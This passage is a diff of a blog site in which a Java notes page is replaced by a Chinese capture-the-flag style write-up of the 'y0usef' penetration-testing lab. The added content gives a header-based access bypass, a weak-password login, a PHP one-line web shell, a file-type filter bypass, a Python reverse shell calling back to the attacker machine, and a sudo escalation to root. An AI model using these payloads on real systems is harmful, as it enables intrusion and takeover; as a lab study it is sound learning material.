-<li>若想向上级抛出异常，必须在抛出异常的方法中使用 <code>throws</code>。</li>
-<li></li>
-</ul>
+<li><p>访问<code>10.0.2.5/adminstration</code>：</p>
+<p><img src="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921114137208"> </p>
+<p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p>
+<p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p>
+<p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p>
+<p><img src="https://img-blog.csdnimg.cn/640c36fceb8d4c4ca68c6d2c52da38bf.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/640c36fceb8d4c4ca68c6d2c52da38bf.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921124711969"> </p>
+<p>发现成功进入一个登录界面：</p>
+<p><img src="https://img-blog.csdnimg.cn/b7d3b2388d064ea2a56dc14139b75dde.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/b7d3b2388d064ea2a56dc14139b75dde.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921124805448"> </p>
+<p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p>
+<p><img src="https://img-blog.csdnimg.cn/50ef13469aae46daaf00688fdb794869.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/50ef13469aae46daaf00688fdb794869.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921130249392">  </p>
+<p><a id="jump5"></a></p>
+<p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p>
+</li>
+<li><p>简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。</p>
+<p>首先编写一个“一句话木马”的PHP 文件<code>shell.php</code>，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试直接将其上传，发现网站提示文件被拒绝：</p>
+<p><img src="https://img-blog.csdnimg.cn/24d305cf59254fe7a9484d760c975610.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/24d305cf59254fe7a9484d760c975610.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921130902640"> </p>
+<p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p>
+<p><img src="https://img-blog.csdnimg.cn/41c28f38eb9f4591addfd2a251254c8c.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/41c28f38eb9f4591addfd2a251254c8c.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131442789"> </p>
+<p>修改为：<code>image/png</code>：</p>
+<p><img src="https://img-blog.csdnimg.cn/2f2eea372d7c4dfab6a060136430772a.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2f2eea372d7c4dfab6a060136430772a.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131518489"> </p>
+<p>文件上传成功了，并提供了上传完成的文件的URL。</p>
+<p><img src="https://img-blog.csdnimg.cn/9254e11db77d43c6940e285e83c4ff74.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/9254e11db77d43c6940e285e83c4ff74.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921131734558"> </p>
+<p><a id="jump6"></a></p>
+<p><code>6:</code> 常见的过滤形式与绕过方法：</p>
+<ol>
+<li>针对文件扩展名的绕过：</li>
+</ol>
+<p>修改文件扩展名后，再上传。</p>
+<p>2)针对文件类型的绕过：</p>
+<p>修改报文中的<code>Content-Type</code>字段（如本次实验）。</p>
+<p>3)针对文件内容的绕过：</p>
+<p>在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。</p>
+</li>
+<li><p>通过URL访问文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php</span><br></pre></td></tr></table></figure>
+
+<p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/fc8f5b4d3cc342beba73a43392887bc7.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/fc8f5b4d3cc342beba73a43392887bc7.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921133834453"> </p>
+<p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure>
+
+<p>得到了靶机上的python路径，说明靶机有python环境：</p>
+<p><img src="https://img-blog.csdnimg.cn/cc91dfe5f0234f4395bb789080bca78d.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/cc91dfe5f0234f4395bb789080bca78d.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921134349689"> </p>
+<p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>修改对应的python代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p>
+<p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p>
+<img src="https://img-blog.csdnimg.cn/ce9a4ed410414c4fb016010423933bca.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/ce9a4ed410414c4fb016010423933bca.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921140145500" style="zoom:67%;" /> 
+
+<p>使用以下指令对反弹shell进行一个简单的升级: </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/b1fd155c1f7946fc85aa636030923c67.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/b1fd155c1f7946fc85aa636030923c67.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921140419911"> </p>
+</li>
+<li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到有以下一项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>说明有一个叫<code>yousef</code>的用户可以登录系统<sup>8</sup>，且主目录为<code>/home/yousef</code>。</p>
+<p>进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。</p>
+<p><a id="jump7"></a></p>
+<p><code>7</code>: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell</span><br></pre></td></tr></table></figure>
+
+<p><a id="jump8"></a></p>
+<p><code>8</code>: 对于用户的登录shell：</p>
+<p><code>/bin/false</code> 是最严格的禁止login选项，一切服务都不能用，</p>
+<p><code>/bin/nologin</code> 只是不允许系统login，可以使用其他ftp等服务</p>
+<p>因此我们一眼就锁定了<code>yousef</code>用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。</p>
+</li>
+<li><p>第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。</p>
+<p>退出反弹shell，在kali的shell使用以下指令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://img-blog.csdnimg.cn/9742303394ec4a7f9fa562a3e944150d.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/9742303394ec4a7f9fa562a3e944150d.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142200653" style="zoom:67%;" /> 
+
+<p> 成功登入yousef后，查看该用户所在的用户组：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/146d29498c314fbca09b7556c687ac0d.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/146d29498c314fbca09b7556c687ac0d.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142413525"> </p>
+<p>发现该用户属于sudo组，查看该用户可执行的指令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/1391df72bbbe46a8bf20a364fc12a148.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/1391df72bbbe46a8bf20a364fc12a148.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142645249"> </p>
+<p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure>
+
+<p>查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。</p>
+</li>
+<li><p>至此我们实现了root权限的提取，并成功获取了所有的两个flag。</p>
 </li>
 </ol>
-<p>参考资料《Java从入门到精通（第5版）》</p>
+<p>【完结撒花】</p>
 
 </div>
   </div>
@@ -3023,10 +3015,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-08-04T12:25:52+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-27T12:45:15+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2022年8月4日</p>
+    <p>更新于：2022年9月27日</p>
   </a>
 </div>
 
@@ -3035,8 +3027,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Java/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Java</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>学习</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%BC%96%E7%A8%8B/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>编程</p></a></div>
-  <span hidden itemprop="keywords">Java 学习 编程</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>学习</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Kali/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Kali</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%BD%91%E7%BB%9C/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>网络</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>安全</p></a></div>
+  <span hidden itemprop="keywords">学习 Kali 网络 安全</span>
 
 
         
@@ -3049,7 +3041,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.kekwy.com/javaNotes-2/&title=类的高级特性与异常处理 - 铃的杂货铺&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=渗透测试学习笔记lab1【y0usef】 - 铃的杂货铺&summary="
           
           >
           
@@ -3061,7 +3053,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.kekwy.com/javaNotes-2/&title=类的高级特性与异常处理 - 铃的杂货铺&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=渗透测试学习笔记lab1【y0usef】 - 铃的杂货铺&summary="
           
           >
           
@@ -3073,7 +3065,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.kekwy.com/javaNotes-2/&title=类的高级特性与异常处理 - 铃的杂货铺&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=渗透测试学习笔记lab1【y0usef】 - 铃的杂货铺&summary="
           
           >
           
@@ -3106,8 +3098,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/javaNotes-3/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>集合类与I/O操作</p>
+      
+        <a class='next' href='/javaNotes-3/'>
+          <p class='title'>集合类与I/O操作<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>数组的长度是固定的，集合的长度是可变的。
 I. Collection接口
 collection 接口时层次结构中的根接口，构成其的单位称为元素。
@@ -3124,30 +3117,6 @@ collection 接口时层次结构中的根接口，构成其的单位称为元素
 add...</p>
         </a>
       
-      
-        <a class='next' href='/javaNotes-1/'>
-          <p class='title'>接口、继承与多态<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>I. 类的继承权限修饰关键字：
-
-
-
-private
-外部以及子类均不可访问
-
-
-
-public
-外部以及子类均不可访问
-
-
-protected
-外部不可，但子类可以访问
-
-
-
-定义类时通过关键...</p>
-        </a>
-      
     </div>
   
   <!-- Custom Files postEnd begin-->
@@ -3161,7 +3130,7 @@ protected
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/javaNotes-2/index.html#comments">
+      <meta itemprop="discussionUrl" content="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -3260,7 +3229,7 @@ protected
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#I-Java%E7%B1%BB%E5%8C%85"><span class="toc-text">I. Java类包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#II-final-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">II. final 关键字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#III-%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-text">III. 内部类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%91%98%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-text">成员内部类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%80%E9%83%A8%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-text">局部内部类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-text">匿名内部类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-text">静态内部类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="toc-text">内部类的继承</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IV-%E5%BC%82%E5%B8%B8%E6%8D%95%E6%8D%89"><span class="toc-text">IV. 异常捕捉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V-Java%E5%B8%B8%E8%A7%81%E5%BC%82%E5%B8%B8"><span class="toc-text">V. Java常见异常</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VI-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8"><span class="toc-text">VI. 自定义异常</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VII-%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8"><span class="toc-text">VII. 抛出异常</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="toc-text">一、实验准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="toc-text">二、实验目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-text">三、实验内容</span></a></li></ol>
     </div>
   </section>
 
@@ -4364,7 +4333,7 @@ volantis.pjax.push(()=>{_hmt.push(['_trackPageview', document.location.pathname]
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/categories/从继承开始的Java应用笔记/","name":"从继承开始的Java应用笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/javaNotes-2/","name":"类的高级特性与异常处理"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"类的高级特性与异常处理","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.kekwy.com/javaNotes-2/"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://blog.kekwy.com/javaNotes-2/","wordCount":0,"datePublished":"2022-08-01T11:50:13.000Z","dateModified":"2022-08-04T04:25:52.401Z","articleSection":"从继承开始的Java应用笔记","keywords":"Java,学习,编程","image":{"@type":"ImageObject","url":"/media/javaNotes-2/headimg.png","width":1024,"height":768}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/categories/渗透测试学习笔记/","name":"渗透测试学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/渗透测试学习笔记/","name":"渗透测试学习笔记lab1【y0usef】"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"渗透测试学习笔记lab1【y0usef】","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","wordCount":0,"datePublished":"2022-09-27T04:44:31.000Z","dateModified":"2022-09-27T04:45:15.278Z","articleSection":"渗透测试学习笔记","keywords":"学习,Kali,网络,安全","image":{"@type":"ImageObject","url":"/media/渗透测试学习笔记/kali-ascii-16x9.png","width":1024,"height":768}}]</script>
 
 
 
